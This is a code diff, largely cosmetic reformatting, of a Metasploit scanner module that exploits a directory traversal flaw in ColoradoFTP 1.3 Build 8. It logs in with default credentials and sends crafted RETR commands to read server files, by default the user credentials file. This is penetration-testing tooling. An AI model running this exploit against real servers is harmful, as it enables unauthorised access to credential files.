@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,47 +7,45 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Ftp
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'ColoradoFTP Server 1.3 Build 8 Directory Traversal Information Disclosure',
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability found in ColoradoFTP server
-        version <= 1.3 Build 8. This vulnerability allows an attacker to download and upload arbitrary files
-        from the server GET/PUT command including file system traversal strings starting with '\\\'.
-        The server is writen in Java and therefore platform independant, however this vulnerability is only
-        exploitable on the Windows version.
-      },
-      'Platform'       => 'win',
-      'Author'         =>
-        [
-          'h00die <mike@shorebreaksecurity.com>',
-          'RvLaboratory', #discovery
-        ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'EDB', '40231'],
-          [ 'URL', 'https://bitbucket.org/nolife/coloradoftp/commits/16a60c4a74ef477cd8c16ca82442eaab2fbe8c86']
-        ],
-      'DisclosureDate' => 'Aug 11 2016'
-    ))
+                      'Name'           => 'ColoradoFTP Server 1.3 Build 8 Directory Traversal Information Disclosure',
+                      'Description'    => %q(
+                        This module exploits a directory traversal vulnerability found in ColoradoFTP server
+                        version <= 1.3 Build 8. This vulnerability allows an attacker to download and upload arbitrary files
+                        from the server GET/PUT command including file system traversal strings starting with '\\\'.
+                        The server is writen in Java and therefore platform independant, however this vulnerability is only
+                        exploitable on the Windows version.
+                      ),
+                      'Platform'       => 'win',
+                      'Author'         =>
+                        [
+                          'h00die <mike@shorebreaksecurity.com>',
+                          'RvLaboratory', # discovery
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'EDB', '40231'],
+                          [ 'URL', 'https://bitbucket.org/nolife/coloradoftp/commits/16a60c4a74ef477cd8c16ca82442eaab2fbe8c86']
+                        ],
+                      'DisclosureDate' => 'Aug 11 2016'))
 
     register_options(
       [
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 2 ]),
         OptString.new('PATH', [ true, 'Path to the file to disclose, releative to the root dir.', 'conf\\xml-users.xml']),
-        OptString.new('FTPUSER', [ true, 'Username to use for login', 'ftpuser']), #override default
-        OptString.new('FTPPASS', [ true, 'Password to use for login', 'ftpuser123']) #override default
-      ], self.class)
-
+        OptString.new('FTPUSER', [ true, 'Username to use for login', 'ftpuser']), # override default
+        OptString.new('FTPPASS', [ true, 'Password to use for login', 'ftpuser123']) # override default
+      ], self.class
+    )
   end
 
-  def check_host(ip)
+  def check_host(_ip)
     begin
       connect
       if /Welcome to ColoradoFTP - the open source FTP server \(www\.coldcore\.com\)/i === banner
@@ -59,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
     Exploit::CheckCode::Safe
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     begin
       connect_login
       sock = data_connect
@@ -68,8 +67,8 @@ class MetasploitModule < Msf::Auxiliary
       file = ::File.basename(file_path)
 
       # make RETR request and store server response message...
-      retr_cmd = '\\\\\\' + ("..\\" * datastore['DEPTH'] ) + "#{file_path}"
-      res = send_cmd( ["retr", retr_cmd], true)
+      retr_cmd = '\\\\\\' + ("..\\" * datastore['DEPTH']) + file_path.to_s
+      res = send_cmd(["retr", retr_cmd], true)
       print_status(res)
       # read the file data from the socket that we opened
       response_data = sock.read(1024)
@@ -79,7 +78,7 @@ class MetasploitModule < Msf::Auxiliary
         return
       end
 
-      if response_data.length == 0
+      if response_data.empty?
         print_status("File (#{file_path})from #{peer} is empty...")
         return
       end
